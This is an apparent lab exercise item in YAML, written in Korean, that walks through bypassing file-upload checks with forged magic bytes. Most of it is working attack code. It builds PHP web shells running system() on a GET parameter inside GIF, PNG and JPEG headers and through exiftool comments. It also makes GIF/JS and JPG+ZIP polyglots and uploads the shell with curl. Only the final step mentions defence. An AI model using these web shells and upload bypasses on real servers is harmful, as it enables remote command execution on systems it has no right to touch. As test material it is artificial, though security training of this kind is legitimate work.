- order: 5
  instruction: |-
    {{WEB_IP}} 대상으로 매직 바이트 조작 업로드을 수행하시오.

    ■ 실습 방법

    ▶ 1단계: 매직 바이트 (file signature) 표
    | 형식 | Magic bytes (hex) | 텍스트 |
    |---|---|---|
    | JPEG | `FF D8 FF E0` 또는 `FF D8 FF E1` | — |
    | PNG | `89 50 4E 47 0D 0A 1A 0A` | `\x89PNG` |
    | GIF87a | `47 49 46 38 37 61` | `GIF87a` |
    | GIF89a | `47 49 46 38 39 61` | `GIF89a` |
    | PDF | `25 50 44 46 2D` | `%PDF-` |
    | ZIP | `50 4B 03 04` | `PK\x03\x04` |
    | ELF | `7F 45 4C 46` | `\x7fELF` |

    ▶ 2단계: 도구 A — printf 으로 magic byte + PHP 결합
    ```bash
    # GIF magic + PHP 코드
    printf 'GIF89a\n<?php system($_GET["c"]); ?>\n' > /tmp/shell.gif
    file /tmp/shell.gif    # → "GIF image data, version 89a" (file 명령 속음)

    # PNG magic + PHP 코드
    printf '\x89PNG\r\n\x1a\n<?php system($_GET["c"]); ?>' > /tmp/shell.png

    # JPEG magic + PHP 코드 (EXIF 영역 활용)
    printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xfe\x00\x14<?php system($_GET["c"]); ?>' > /tmp/shell.jpg
    ```

    ▶ 3단계: 도구 B — exiftool 으로 메타데이터 영역에 코드 삽입
    설치: `sudo apt install libimage-exiftool-perl`. 사용:
    ```bash
    cp normal.jpg /tmp/shell.jpg
    exiftool -comment='<?php system($_GET["c"]); ?>' /tmp/shell.jpg
    # comment 영역에 PHP 코드 삽입 → 정상 이미지 + 코드 동시
    ```

    ▶ 4단계: 도구 C — polyglot 파일 (정상 이미지 + 실행 코드)
    ```bash
    # GIF + JS polyglot (브라우저는 이미지 + script 둘 다 처리)
    printf 'GIF89a/*<svg/onload=alert(1)>*/=2;' > /tmp/poly.gif

    # JPG + ZIP polyglot (jar 형태로 실행)
    cat shell.jpg shell.zip > /tmp/poly.jar
    ```

    ▶ 5단계: 도구 D — file 명령으로 검증 우회 시뮬
    ```bash
    # 서버가 file 명령으로 mime 검증 시
    file /tmp/shell.gif
    # → "GIF image data, version 89a, ..." (속임)
    file -b --mime-type /tmp/shell.gif
    # → "image/gif"

    # 그러나 .php 확장자 + GIF 헤더 = 일부 서버 PHP 실행
    cp /tmp/shell.gif /tmp/shell.php
    curl -F "file=@/tmp/shell.php" http://target/api/upload
    ```

    ▶ 6단계: 답변
    `file /tmp/shell.gif` 출력 quote + magic byte 우회 원리 + 방어 (전체 파일 검증, ImageMagick re-encode) 1 문장.
